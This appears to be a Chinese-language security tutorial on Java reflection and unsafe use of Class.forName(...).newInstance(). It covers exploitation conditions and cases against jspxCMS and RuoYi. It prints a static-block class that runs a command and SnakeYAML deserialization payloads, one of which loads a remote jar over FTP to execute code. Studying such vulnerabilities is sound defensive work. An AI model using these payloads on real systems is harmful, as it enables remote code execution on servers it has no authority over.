反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。
按照我的理解，java中的反射有点类似与php中实例化另一个文件中的类，并且调用任意的类方法，修改任意的类成员变量值等，就好像的把另一个php代码文件反射到新的代码文件中进行使用。
反射的几种写法
```
public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        //1、根据全限定类名：Class.forName("全路径类名")
        Class aClass = Class.forName("com.example.reflectdemo1.User");
        System.out.println(aClass);

        //2、根据类名：类名.class
        Class userClass = User.class;
        System.out.println(userClass);

        //3、根据对象：对象.getClass()
        User user= new User();
        Class aClass1 = user.getClass();
        System.out.println(aClass1);

        //4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass("全路径类名");
        ClassLoader clsload=ClassLoader.getSystemClassLoader();
        Class aClass2 = clsload.loadClass("com.example.reflectdemo1.User");
        System.out.println(aClass2);
    }
}
```
## **危险写法**
实战中最常见的是第一种写法可能出现可控，Class.forName("全类名")，然后还要通过newInstance()方法实例化(自动调用静态块等)
演示代码:
Class.forname("全类名").newInstance()

这种写法然后类名我们可控的话就可以尝试利用
除了第一种，其他几种写法实战会比较少

想要通过Class.forName(beanName).newInstance()成功实例化，必须满足类至少有一个构造函数(无参且public):
java.lang.Runtime.getRuntime().exec("")不行，getRuntime()的构造函数部位public。
new ProcessBuilder不行，构造函数有参。

^
## **利用方式**
已知反射可控
第一种：上传自定义的恶意类
1.项目环境为tomcat
2.网站存在任意文件上传，能够上传.class文件并指定上传目录为工作目录下（应用类加载器）

第二种：利用项目环境中现有的恶意类
1.类必须要有无参构造函数 .
2.类的构造函数不能是私有的 , 也就是不能通过 “private“ 修饰符来修饰构造函数 
3.调用目标字符串的参数为：支持字符串，布尔类型，长整型，浮点型，整型
4.在满足上面三个条件后我们还得能够造成危害

实战案例：
jspxCMS不安全反射

```
public class Eval {
    // newInstance() 会自动调用静态代码块
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

Ruoyi不安全反射并方法调用。
配合snakeYaml中类的反序列化漏洞
Yaml类构造方法为public方法且无参

?全类名+方法(参数)=
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager[ !!java.net.URLClassLoader [[ !!java.net.URL ["http://dnslog.cn"] ]]]')
```
这里是字符串会被解析成beanName，methodName，methodName参数调用。
```
Object bean = Class.forName(beanName).newInstance();        
invokeMethod(bean, methodName, methodName);
```




^
利用
使用ftp协议的原因是http被禁用
```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL ["ftp://ip/yaml-payload.jar"]  ]]]')
```


